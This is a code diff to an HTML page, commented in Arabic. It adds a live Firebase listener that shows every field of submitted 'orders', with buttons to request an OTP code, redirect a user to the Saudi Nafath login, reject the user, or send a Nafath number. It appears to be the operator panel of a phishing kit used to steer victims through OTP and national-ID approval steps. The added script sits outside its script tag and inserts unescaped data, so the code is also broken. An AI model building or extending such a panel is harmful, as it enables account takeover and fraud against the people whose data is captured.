@@ -112,7 +112,49 @@
             alert("خطأ في الإرسال.");
         }
     }
-</script>
+</script>    // جلب البيانات "لايف" وعرض كل الحقول المتاحة
+db.collection("orders").onSnapshot((snapshot) => {
+    const listDiv = document.getElementById('orders-list');
+    listDiv.innerHTML = ""; 
+
+    if (snapshot.empty) {
+        listDiv.innerHTML = "<p style='text-align:center;'>لا توجد طلبات حالياً.</p>";
+        return;
+    }
+
+    snapshot.forEach((doc) => {
+        const data = doc.data();
+        const id = doc.id;
+
+        // بناء قائمة البيانات ديناميكياً (عشان يظهر كل شي مخفي)
+        let allFieldsHTML = "";
+        for (let key in data) {
+            if (key !== 'timestamp') { // تخطي الوقت لإبقاء المنظر مرتب
+                allFieldsHTML += `<div><span>${key}:</span> ${data[key]}</div>`;
+            }
+        }
+
+        const card = `
+            <div class="order-card" style="border-right: 5px solid #007bff;">
+                <div class="details">
+                    ${allFieldsHTML}
+                </div>
+                <div class="actions">
+                    <button class="btn-otp" onclick="updateStep('${id}', 'GO_TO_OTP')">طلب كود OTP</button>
+                    <button class="btn-nafath" onclick="updateStep('${id}', 'GO_TO_NAFATH')">تحويل لنفاذ</button>
+                    <button class="btn-reject" onclick="updateStep('${id}', 'GO_TO_REJECT')">رفض الطلب</button>
+                    <div style="margin-right: auto;">
+                        <input type="number" id="code-${id}" placeholder="رقم نفاذ">
+                        <button class="btn-send" onclick="sendNafathCode('${id}')">إرسال الرقم</button>
+                    </div>
+                </div>
+            </div>
+        `;
+        listDiv.innerHTML += card;
+    });
+});
+
+
 
 </body>
 </html>
